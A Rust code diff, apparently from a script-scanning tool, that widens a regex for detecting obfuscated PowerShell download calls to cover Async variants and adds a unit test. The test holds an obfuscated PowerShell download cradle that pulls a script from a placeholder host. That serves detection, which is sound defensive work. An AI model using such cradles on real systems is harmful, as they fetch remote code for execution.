@@ -303,7 +303,7 @@ static PS_URL_REGEX_SPECS: &[PsUrlRegexSpec] = &[
 #[allow(clippy::expect_used)]
 static DYNAMIC_DOWNLOAD_INVOKE_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
+        r#"(?is)\.\s*\(?\s*["'](?:Download(?:String|File|Data)(?:Async)?|Down)["']\s*\)?\s*\.Invoke\s*\(\s*(?:\$([A-Za-z_][A-Za-z0-9_]*)|["']([^"']+)["'])"#,
     )
     .expect("dynamic download invoke")
 });
@@ -5066,6 +5066,20 @@ fn line_has_powershell_payload_flag(line: &str) -> bool {
             Some("EncodedCommand" | "Command")
         )
     })
+}
+
+#[cfg(test)]
+mod dynamic_download_invoke_tests {
+    use super::dynamic_download_invoke_urls;
+
+    #[test]
+    fn dynamic_downloadstringasync_invoke_url_extracted() {
+        let urls = dynamic_download_invoke_urls(
+            r#"$b=New-Object Net.WebClient;$b.('DownloadStringAsync').Invoke('https://dyn-async.example/a.ps1')"#,
+        );
+
+        assert_eq!(urls, vec!["https://dyn-async.example/a.ps1"]);
+    }
 }
 
 #[cfg(test)]
